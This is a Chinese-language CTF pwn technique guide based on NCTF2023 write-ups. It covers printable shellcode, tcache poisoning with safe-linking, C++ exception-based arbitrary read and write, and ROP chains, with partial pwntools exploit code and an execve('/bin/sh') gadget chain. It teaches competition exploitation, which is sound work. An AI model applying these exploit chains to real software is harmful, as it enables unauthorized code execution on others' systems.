# CTF Pwn 方向通用技巧

> 关键词:CTF,Pwn,二进制漏洞,shellcode,可见字符,alpha3,堆利用,tcache,safe-linking,堆溢出,UAF,double-free,任意地址读写,ROP,C++异常,canary,沙箱,seccomp
> 本文件提炼自 NCTF2023 Writeup 及通用 Pwn CTF 经验,覆盖 shellcode 类与堆利用类两大主线。

## 一、可见字符 shellcode(可打印 ASCII shellcode)

### 场景

程序读取 shellcode 并执行,但对字节做白名单过滤:只允许可见 ASCII(`0x21`~`0x7A`,如 `0-9 A-Z a-z /` 等)。此时普通 shellcode 无法直接写入。

### 生成方法

1. **手写受限汇编**:用仅含可见字符机器码的指令序列表达逻辑(如 `jmp`/`xor`/`push`/`pop`/`syscall` 的可见编码)。
2. **编码器生成**:用 **alpha3** / `msfvenom` 的 alphanumeric 编码器把任意 shellcode 编码成可见字符形式,运行时自解码。
3. **两阶段发送**:先发送可见字符的引导段(设置寄存器、跳到后续 shellcode),再发送完整编码 shellcode。

### 示例(NCTF2023 checkin)

程序:mmap 固定地址(`0x20230000`,RWX),读入 shellcode 并逐字节校验可见字符,随后把栈上 payload 复制到 mmap 区开头,调 sandbox() 后跳转执行。

exp 结构:
- 先发可见字符引导:`b'jBZPPPf1Tt0XXXXXXX' + b'Ph0666...'`(alpha3 风格),利用栈上入口地址设置 rax;
- 再发实现 `open("flag") → read → write` 的可见字符 shellcode,末尾 `\xcc` 填充。

```python
from pwn import *
context.clear(arch='amd64', os='linux')

sh = remote('8.130.35.16', 58002)
sh.sendafter(b'shellcode: ', b'jBZPPPf1Tt0XXXXXXX' + b'Ph0666...')  # 引导段
sh.recvuntil(b'0')
shellcode = asm('''...open/read/write 汇编...''')
sh.send(shellcode.ljust(0x400, b'\xcc'))
sh.interactive()
```

### 沙箱注意

- 若开了 seccomp 白名单,只允许 `open/read/write` 等,shellcode 内不要用 `execve`,改用"open flag → read → write"。
- 常见绕过 open 路径:用 `mov rax, 'flag'` 压栈构造路径字符串。

## 二、堆利用主线:tcache-hijack(tcache poisoning)

glibc 2.32+ 的 tcache 引入 **safe-linking**:空闲 chunk 的 fd 存储为 `(chunk地址 >> 12) ^ next_ptr`。覆写 fd 时需要按该异或编码。

### 通用利用流程(堆题六步)

1. **漏洞定位与原语**:确认是 UAF、堆溢出、double-free 还是 off-by-one;本题是 `date=date=date` 触发堆溢出。
2. **布局**:分配多个 chunk,交错 add/delete,制造可控的 tcache bin 状态(如让被溢出 chunk 进入 tcache,或 double-free 制造循环)。
3. **泄露 libc**:通常利用 unsorted bin 残留的 main_arena 指针(`show` 读出后减偏移,如 `- 0x1ff130`);或 largebin/IO 相关。
4. **泄露堆地址**:利用 tcache 链中残留指针,或通过 `show` 读 chunk 头;safe-linking 需要堆地址做异或。
5. **任意地址写**:把 tcache 的 fd 覆写为目标地址(编码为 `(heap >> 12) ^ target`),连续两次 malloc 拿到目标内存,写入指针/返回地址。也可打 `__free_hook`/`__malloc_hook`(注意新版本已移除 hook,可打 `_IO_2_1_stdout_`/FSOP 或直接打栈)。
6. **getshell**:泄露程序基址(image base)与栈地址后,覆写返回地址为 ROP(one_gadget 或 execve 链)。

### safe-linking 编码示例

```python
# 把 tcache fd 指向目标地址 target
payload = p64((heap_addr >> 12) ^ target)
add(content=payload)

# 泄露堆地址:show 出 chunk 头残留指针后,低 12 位为 0 时直接 << 12 恢复
heap_addr = u64(leak) << 12
```

### 完整链示意(NCTF2023 npointment)

```
堆溢出改 size/fd → tcache poisoning 任意写
→ show 泄露 libc(- 0x1ff130)
→ show 泄露堆(<< 0x1000)
→ 泄露 image base(- 0x3e78)与栈地址
→ 覆写栈返回地址为 ROP(execve("/bin/sh") / system)
```

关键 ROP 片段:

```python
flat([
    libc_addr + 0x28715,   # pop rdi; ret
    libc_addr + 0x1c041b,  # "/bin/sh"
    libc_addr + 0x2a671,   # ret
    0,
    libc_addr + 0x93359,   # pop rsi; ...
    0, 0,
    libc_addr + 0x46663,   # pop rax
    59,                    # execve
    libc_addr + 0x942b6,   # syscall
])
```

### 常见坑

- safe-linking 忘记 `>> 12` 异或;
- tcache bin 有 count 上限(默认 7),double-free 需构造绕过检测;
- 泄露的地址要减对偏移(不同 libc 版本偏移不同);
- 高版本 glibc 打 `__free_hook` 不可行,优先打栈/FSOP。

## 三、C++ 异常处理利用

### 场景

`catch` 块、`__cxa_begin_catch`/`__Unwind_Resume` 等异常机制里存在**对可控内存的写操作**(如 `mov [rbp+0xe], rax`),栈溢出可控制 `rbp`,把该"写原语"落到可控位置,实现任意地址读写。

### 利用流程(NCTF2023 nception)

1. **栈溢出控制 rbp**:edit 溢出覆写保存的 rbp,使 catch 块中 `mov [rbp+0xe], rax` 写到攻击者选择的内存(如全局指针附近)。
2. **构造任意地址读写原语**:把某个指针字段覆写为任意目标地址,`show` 读出内容(泄露 libc、栈)。
3. **扫描栈**:逐地址读,比对特征值(如 `libc_addr + 0x27200`)定位返回地址,同区域读 canary。
4. **ROP**:溢出载荷带上 canary,覆写返回地址为 execve 链。

```python
# 把指针改写为目标地址 → show 实现任意读
edit(0, 0x130, p64(target_addr))
edit(0, 0x130 + 8, p32(0x444))
show(6)
# 泄露后
edit(0, 0, b'\0'*0x10 + cyclic(504) + p64(canary) + flat([...rop...]))
```

### 要点

- C++ 异常会经过 libstdc++ 的 `_Unwind_` 机制,注意异常表(LSDA)与 catch 地址;
- 写原语地址计算:`[rbp+0xe]` → 目标 = rbp + 0xe;
- 与"栈迁移"配合:控制 rbp 后也能迁移栈到可控区域。

## 四、Pwn 辅助速查

| 手法 | 要点 | 工具 |
| --- | --- | --- |
| 栈溢出 | 找溢出点→覆盖返回地址→ROP/ret2libc;保护 NX/PIE/Canary 逐个击破 | pwntools、ROPgadget、ropper |
| 格式化字符串 | `%p`/`%s` 泄露、`%n` 任意写;注意偏移定位 | pwntools fmtstr 模块 |
| 整数溢出 | 溢出后控制分配/索引,转为越界读写 | - |
| off-by-one | 改相邻 chunk size,构造堆重叠 | - |
| 沙箱 | seccomp 白名单→ORW(open/read/write);黑名单→找未禁 syscall | seccomp-tools |
| 调试 | gdb + pwndbg/peda;`set follow-fork-mode` | gdb、gdb-gef |

## 合规声明

Pwn 利用技术仅适用于 CTF 题目环境与授权测试靶标;请勿用于未授权系统。
